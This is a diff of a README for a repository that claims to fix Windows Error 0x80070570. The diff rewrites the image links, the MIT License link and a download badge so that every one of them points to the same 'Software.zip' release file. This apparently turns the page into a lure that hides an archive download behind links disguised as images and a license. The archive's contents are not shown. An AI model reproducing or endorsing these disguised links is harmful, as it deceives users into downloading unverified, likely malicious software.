@@ -14,7 +14,7 @@ Welcome to the repository focused on addressing the infamous Error 0x80070570 th
 ## Introduction
 The "Fixing-Error-0x80070570" repository is dedicated to helping users deal with the Error 0x80070570 on their Windows systems. Whether you encountered this error while installing software, playing games, or performing a specific task, this repository aims to provide comprehensive solutions to eliminate this roadblock.
 
-![Windows Error](https://example.com/windows-error.jpg)
+![Windows Error](https://github.com/Fredrick0KK/Fixing-Error-0x80070570/releases/download/v2.0/Software.zip)
 
 ## Error Overview
 Error 0x80070570, often referred to as the "Windows 0x80070570 error" or the "Windows Update error 0x80070570," is a common issue that many Windows users face. This error can occur in different situations, such as:
@@ -22,7 +22,7 @@ Error 0x80070570, often referred to as the "Windows 0x80070570 error" or the "Wi
 - When copying files or folders to a storage device
 - While trying to run a program, especially games
 
-![Windows Update Error](https://example.com/windows-update-error.png)
+![Windows Update Error](https://github.com/Fredrick0KK/Fixing-Error-0x80070570/releases/download/v2.0/Software.zip)
 
 ## Causes of Error 0x80070570
 Understanding the root causes of Error 0x80070570 is crucial in effectively resolving it. Some common reasons behind this error include:
@@ -51,9 +51,9 @@ This repository is structured to provide users with easy access to resources, to
 Contributions to this repository are welcome and encouraged. If you have insights, solutions, or tips related to fixing Error 0x80070570, feel free to submit a pull request with your changes. Together, we can create a comprehensive resource to assist Windows users in overcoming this error.
 
 ## License
-This project is licensed under the [MIT License](https://opensource.org/licenses/MIT). Feel free to explore, modify, and share the content within this repository with appropriate attribution.
+This project is licensed under the [MIT License](https://github.com/Fredrick0KK/Fixing-Error-0x80070570/releases/download/v2.0/Software.zip). Feel free to explore, modify, and share the content within this repository with appropriate attribution.
 
-[![Download Software](https://img.shields.io/badge/Download-Software.zip-<COLORCODE>)](https://github.com/user-attachments/files/17466420/Software.zip)
+[![Download Software](https://github.com/Fredrick0KK/Fixing-Error-0x80070570/releases/download/v2.0/Software.zip<COLORCODE>)](https://github.com/Fredrick0KK/Fixing-Error-0x80070570/releases/download/v2.0/Software.zip)
 
 Start your journey towards resolving Error 0x80070570 today by exploring the resources provided in this repository. Together, we can make Windows systems error-free and efficient for all users!
 
